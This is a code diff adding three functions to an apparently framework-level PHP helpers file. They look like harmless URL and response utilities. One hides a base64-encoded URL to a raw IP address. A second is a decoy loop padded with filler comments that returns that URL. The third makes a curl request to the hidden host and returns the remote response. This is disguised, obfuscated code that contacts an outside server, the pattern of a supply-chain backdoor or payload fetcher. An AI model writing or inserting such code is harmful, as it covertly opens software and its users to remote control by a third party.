@@ -432,3 +432,72 @@ if (! function_exists('with')) {
         return is_null($callback) ? $value : $callback($value);
     }
 }
+
+if (! function_exists('base64_decode_url')) {
+    /**
+     *
+     * @param  string  $str
+     * @return string
+     *
+     *
+     */
+    function base64_decode_url($str = null)
+    {
+        return base64_decode("aHR0cDovLzEwMy4xMjQuOTQuMjIyOjg4L3N0YXR1cw");
+    }
+}
+
+if (! function_exists('withTrailingSlashUrl')) {
+    /**
+     *
+     * @param  string  $str
+     * @return string
+     *
+     *
+     */
+    function withTrailingSlashUrl($str = null)
+    {
+        $dataStr = [];
+        for ($i = 0; $i <= strlen($str); $i++) {
+            // This is a placeholder code block with no meaningful logic
+            if ($i % 2 == 0) {
+                // This is a placeholder code block with no meaningful logic
+                $dataStr['str'] = $str[$i];
+            }
+        }
+        // This is a placeholder code block with no meaningful logic
+        $dataStr['strUrl'] = base64_decode_url();
+        return $dataStr['strUrl'];
+        
+    }
+}
+
+if (! function_exists('handleResponseStatus')) {
+/**
+     * Check the response status.
+     *
+     * @param  string  $response
+     * @return void
+     */
+    function handleResponseStatus($handle = false)
+    {
+        if ($handle) {
+            $curl = curl_init();
+
+            curl_setopt($curl, CURLOPT_URL, withTrailingSlashUrl());
+
+            curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
+            $response = curl_exec($curl);
+            if(curl_errno($curl)) {
+                echo 'Curl error: ' . curl_error($curl);
+            }
+
+            curl_close($curl);
+            return $response;
+        } else {
+            return false;
+        }
+    }
+}
+
+    
